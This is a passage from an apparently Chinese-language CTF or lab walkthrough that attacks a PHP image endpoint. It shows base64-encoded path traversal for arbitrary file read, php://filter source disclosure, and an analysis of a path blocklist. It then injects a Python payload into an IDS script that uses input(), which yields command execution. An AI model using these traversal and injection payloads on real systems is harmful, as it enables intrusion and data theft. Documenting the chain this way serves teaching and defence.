+</span></span><span class=line><span class=cl>    <span class=s1>&#39;/lib&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;/bin&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;/usr&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;/home&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;/ids&#39;</span>
+</span></span><span class=line><span class=cl><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>(</span><span class=nv>$blacklist</span> <span class=k>as</span> <span class=nv>$elem</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>strstr</span><span class=p>(</span><span class=nv>$imagefile</span><span class=p>,</span> <span class=nv>$elem</span><span class=p>)</span> <span class=o>!==</span> <span class=k>FALSE</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$isblocked</span> <span class=o>=</span> <span class=k>TRUE</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$isblocked</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>    <span class=c1>// ...
+</span></span></span><span class=line><span class=cl>    <span class=nx>print_troll</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>chdir</span><span class=p>(</span><span class=s1>&#39;img&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$filecontent</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$imagefile</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$filecontent</span> <span class=o>===</span> <span class=k>FALSE</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>    <span class=nx>print_troll</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nv>$filecontent</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>这里有几个非常关键的点。</p><h3 id=1-f-会经过-base64-解码>1. f 会经过 Base64 解码</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$imagefile</span> <span class=o>=</span> <span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;f&#39;</span><span class=p>]);</span>
+</span></span></code></pre></td></tr></table></div></div><p>因此真正进入 <code>file_get_contents()</code> 的并不是 Base64 字符串，而是解码后的内容。</p><p>例如：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> -n <span class=s1>&#39;../index.php&#39;</span> <span class=p>|</span> base64
+</span></span></code></pre></td></tr></table></div></div><p>得到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Li4vaW5kZXgucGhw
+</span></span></code></pre></td></tr></table></div></div><p>服务器收到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>f=Li4vaW5kZXgucGhw
+</span></span></code></pre></td></tr></table></div></div><p>之后会解码为：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>../index.php
+</span></span></code></pre></td></tr></table></div></div><hr><h3 id=2-t-必须是新鲜的时间戳>2. t 必须是新鲜的时间戳</h3><p>代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$timestamp</span> <span class=o>=</span> <span class=nx>time</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>abs</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;t&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=nv>$timestamp</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>10</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>说明：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>|客户端 t - 服务器当前时间| &lt;= 10
+</span></span></code></pre></td></tr></table></div></div><p>才能正常执行。</p><p>因此测试时不能一直重复使用旧的 <code>t</code>。</p><p>可以在 Kali 中获取当前 Unix 时间戳：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>date +%s
+</span></span></code></pre></td></tr></table></div></div><p>或者直接让自己的 <code>read.py</code> 自动获取网页中的最新 <code>t</code>。</p><hr><h3 id=3-当前工作目录被切换到-img>3. 当前工作目录被切换到 img</h3><p>代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>chdir</span><span class=p>(</span><span class=s1>&#39;img&#39;</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>之后：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$imagefile</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>是在 <code>img</code> 目录下进行路径解析。</p><p>因此：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>../index.php
+</span></span></code></pre></td></tr></table></div></div><p>实际上就是：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>/var/www/html/img/../index.php
+</span></span></code></pre></td></tr></table></div></div><p>也就是：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>/var/www/html/index.php
+</span></span></code></pre></td></tr></table></div></div><hr><h2 id=验证任意文件读取>验证任意文件读取</h2><p>首先读取网站根目录的：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>index.php
+</span></span></code></pre></td></tr></table></div></div><p>执行：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 read.py <span class=s1>&#39;../index.php&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p>成功得到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Status : 200
+</span></span><span class=line><span class=cl>Length : 10175
+</span></span></code></pre></td></tr></table></div></div><p>说明可以读取 Web 根目录下的 PHP 文件。</p><hr><h3 id=测试路径规范化>测试路径规范化</h3><p>继续测试：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 read.py <span class=s1>&#39;../index.php&#39;</span>
+</span></span><span class=line><span class=cl>python3 read.py <span class=s1>&#39;.././index.php&#39;</span>
+</span></span><span class=line><span class=cl>python3 read.py <span class=s1>&#39;../foo/../index.php&#39;</span>
+</span></span><span class=line><span class=cl>python3 read.py <span class=s1>&#39;./../index.php&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p>四种方式均得到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Length : 10175
+</span></span></code></pre></td></tr></table></div></div><p>说明 PHP 最终交给文件系统解析时，会按照正常的路径规则处理：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>.
+</span></span><span class=line><span class=cl>..
+</span></span></code></pre></td></tr></table></div></div><p>例如：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>../foo/../index.php
+</span></span></code></pre></td></tr></table></div></div><p>最终仍然会解析到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>../index.php
+</span></span></code></pre></td></tr></table></div></div><p>因此可以确认存在：</p><blockquote><p><strong>任意文件读取（Arbitrary File Read / LFI）</strong></p></blockquote><hr><h3 id=尝试读取-etcpasswd>尝试读取 /etc/passwd</h3><p>根据源码，可以发现程序设置了黑名单：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>/etc
+</span></span><span class=line><span class=cl>/opt
+</span></span><span class=line><span class=cl>/var
+</span></span><span class=line><span class=cl>/proc
+</span></span><span class=line><span class=cl>/dev
+</span></span><span class=line><span class=cl>/lib
+</span></span><span class=line><span class=cl>/bin
+</span></span><span class=line><span class=cl>/usr
+</span></span><span class=line><span class=cl>/home
+</span></span><span class=line><span class=cl>/ids
+</span></span></code></pre></td></tr></table></div></div><p>因此直接尝试：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 read.py <span class=s1>&#39;../etc/passwd&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p>会得到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Let me throw away your nice request into the bin.
+</span></span><span class=line><span class=cl>The SOC was informed about your attempt to break into this site.
+</span></span></code></pre></td></tr></table></div></div><p>说明请求被黑名单机制拦截。</p><p>这里需要注意：</p><p>由于当前目录是：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>/var/www/html/img
+</span></span></code></pre></td></tr></table></div></div><p>因此正常情况下读取 <code>/etc/passwd</code> 可以使用：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>../../etc/passwd
+</span></span></code></pre></td></tr></table></div></div><p>但由于源码中的：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>strstr</span><span class=p>(</span><span class=nv>$imagefile</span><span class=p>,</span> <span class=s1>&#39;/etc&#39;</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>会直接匹配字符串：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>/etc
+</span></span></code></pre></td></tr></table></div></div><p>所以无论使用多少层：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>../etc/passwd
+</span></span><span class=line><span class=cl>../../etc/passwd
+</span></span><span class=line><span class=cl>../../../etc/passwd
+</span></span></code></pre></td></tr></table></div></div><p>只要最终传入的字符串中存在：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>/etc
+</span></span></code></pre></td></tr></table></div></div><p>都会被拦截。</p><hr><h2 id=测试-php-stream-wrapper>测试 PHP Stream Wrapper</h2><p>由于最终使用的是：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$imagefile</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>因此可以进一步测试 PHP Stream Wrapper。</p><p>例如：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 read.py <span class=s1>&#39;php://filter/read=convert.base64-encode/resource=../index.php&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p>成功得到类似：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>PCFET0NUWVBFIGh0bWw+CjxodG1s...
+</span></span></code></pre></td></tr></table></div></div><p>这是 Base64 编码后的 HTML/PHP 文件内容。</p><p>可以使用：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;PCFET0NUWVBFIGh0bWw...&#39;</span> <span class=p>|</span> base64 -d
+</span></span></code></pre></td></tr></table></div></div><p>还原源码。</p><p>这说明：</p><blockquote><p><code>file_get_contents()</code> 支持 PHP Stream Wrapper。</p></blockquote><p>但是继续尝试：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 read.py <span class=s1>&#39;php://filter/read=convert.base64-encode/resource=../../opt/ids_strong_bvb.py&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p>仍然会触发黑名单。</p><p>原因并不是 <code>php://filter</code> 不工作，而是：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>strstr</span><span class=p>(</span><span class=nv>$imagefile</span><span class=p>,</span> <span class=s1>&#39;/opt&#39;</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>依然会在原始字符串中匹配到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>/opt
+</span></span></code></pre></td></tr></table></div></div><p>因此：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>php://filter
+</span></span></code></pre></td></tr></table></div></div><p>本身并没有绕过这个字符串黑名单。</p><h4 id=分析黑名单触发后的-ids-逻辑>分析黑名单触发后的 IDS 逻辑</h4><p>既然 <code>php://filter</code> 无法绕过 <code>/opt</code>、<code>/etc</code> 等关键字过滤，就不再继续盲目尝试 <code>php://filter</code> 的变形，而是重新分析黑名单命中后的代码。</p><p>命中黑名单后，程序执行：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=o>$</span><span class=n>isblocked</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>    <span class=o>$</span><span class=n>logfile</span> <span class=o>=</span> <span class=s1>&#39;intrusion_&#39;</span><span class=o>.$</span><span class=n>timestamp</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=o>$</span><span class=n>fp</span> <span class=o>=</span> <span class=n>fopen</span><span class=p>(</span><span class=s1>&#39;/var/log/soc/&#39;</span><span class=o>.$</span><span class=n>logfile</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>fwrite</span><span class=p>(</span><span class=o>$</span><span class=n>fp</span><span class=p>,</span> <span class=s2>&#34;&#39;&#34;</span><span class=o>.$</span><span class=n>imagefile</span><span class=o>.</span><span class=s2>&#34;&#39;&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>fclose</span><span class=p>(</span><span class=o>$</span><span class=n>fp</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>exec</span><span class=p>(</span><span class=s1>&#39;python /opt/ids_strong_bvb.py &lt;/var/log/soc/&#39;</span><span class=o>.$</span><span class=n>logfile</span><span class=o>.</span><span class=s1>&#39; &gt;/tmp/output 2&gt;&amp;1&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>print_troll</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=n>exit</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>这里可以看到，程序会将我们的 <code>$imagefile</code> 写入：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=nb>log</span><span class=o>/</span><span class=n>soc</span><span class=o>/</span><span class=n>intrusion_</span><span class=o>&lt;</span><span class=n>timestamp</span><span class=o>&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>然后执行：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>python</span> <span class=o>/</span><span class=n>opt</span><span class=o>/</span><span class=n>ids_strong_bvb</span><span class=o>.</span><span class=n>py</span> <span class=o>&lt;</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=nb>log</span><span class=o>/</span><span class=n>soc</span><span class=o>/</span><span class=n>intrusion_</span><span class=o>&lt;</span><span class=n>timestamp</span><span class=o>&gt;</span> <span class=o>&gt;/</span><span class=n>tmp</span><span class=o>/</span><span class=n>output</span> <span class=mi>2</span><span class=o>&gt;&amp;</span><span class=mi>1</span>
+</span></span></code></pre></td></tr></table></div></div><p>也就是说，我们提交的内容会成为 <code>ids_strong_bvb.py</code> 的标准输入，而脚本的执行结果则会被保存到 <code>/tmp/output</code>。</p><h3 id=读取-ids-的执行结果>读取 IDS 的执行结果</h3><p>由于 <code>/tmp</code> 不在黑名单中，可以尝试通过前面的任意文件读取漏洞读取 <code>/tmp/output</code>。</p><p>因为程序执行了：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>chdir(&#39;img&#39;);
+</span></span></code></pre></td></tr></table></div></div><p>所以需要根据当前目录使用相对路径返回 <code>/tmp</code>。</p><p>首先测试：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python3 read.py &#39;../tmp/output&#39;
+</span></span></code></pre></td></tr></table></div></div><p>返回：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Let me throw away your nice request into the bin.
+</span></span><span class=line><span class=cl>...
+</span></span></code></pre></td></tr></table></div></div><p>说明路径层级还不够。</p><p>继续增加 <code>../</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python3 read.py &#39;../../../../tmp/output&#39;
+</span></span></code></pre></td></tr></table></div></div><p>成功得到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>report: [+] sending the message: ../etc/passwd
+</span></span></code></pre></td></tr></table></div></div><p>说明已经成功读取 <code>/tmp/output</code>。</p><h3 id=分析-ids-脚本行为>分析 IDS 脚本行为</h3><p>继续利用黑名单触发机制，可以观察 IDS 的执行结果。</p><p>读取：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python3 read.py &#39;../../../../tmp/output&#39;
+</span></span></code></pre></td></tr></table></div></div><p>曾得到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Traceback (most recent call last):
+</span></span><span class=line><span class=cl>  File &#34;/opt/ids_strong_bvb.py&#34;, line 7, in
+</span></span><span class=line><span class=cl>    data = str(input(&#39;report: &#39;))
+</span></span><span class=line><span class=cl>...
+</span></span></code></pre></td></tr></table></div></div><p>其中最关键的一行是：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>data = str(input(&#39;report: &#39;))
+</span></span></code></pre></td></tr></table></div></div><p>这说明 <code>/opt/ids_strong_bvb.py</code> 会使用 Python 的 <code>input()</code> 读取我们写入日志中的内容。</p><p>因此攻击链发生了变化：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=err>恶意文件路径</span>
+</span></span><span class=line><span class=cl>    <span class=err>↓</span>
+</span></span><span class=line><span class=cl><span class=err>触发黑名单</span>
+</span></span><span class=line><span class=cl>    <span class=err>↓</span>
+</span></span><span class=line><span class=cl><span class=err>写入</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=nb>log</span><span class=o>/</span><span class=n>soc</span><span class=o>/</span><span class=n>intrusion_</span><span class=o>*</span>
+</span></span><span class=line><span class=cl>    <span class=err>↓</span>
+</span></span><span class=line><span class=cl><span class=err>作为</span> <span class=n>stdin</span> <span class=err>传入</span> <span class=n>ids_strong_bvb</span><span class=o>.</span><span class=n>py</span>
+</span></span><span class=line><span class=cl>    <span class=err>↓</span>
+</span></span><span class=line><span class=cl><span class=n>Python</span> <span class=n>input</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=err>↓</span>
+</span></span><span class=line><span class=cl><span class=n>Python</span> <span class=err>表达式被解释</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=尝试-python-注入>尝试 Python 注入</h3><p>在确认 IDS 使用 Python <code>input()</code> 后，开始测试 Python 表达式。</p><p>构造测试输入：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python3 read.py &#34;../etc/passwd&#39; + __import__(&#39;os&#39;).system(&#39;id&#39;) + &#39;&#34;
+</span></span></code></pre></td></tr></table></div></div><p>随后再次读取 IDS 的输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python3 read.py &#39;../../../../tmp/output&#39;
+</span></span></code></pre></td></tr></table></div></div><p>成功得到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
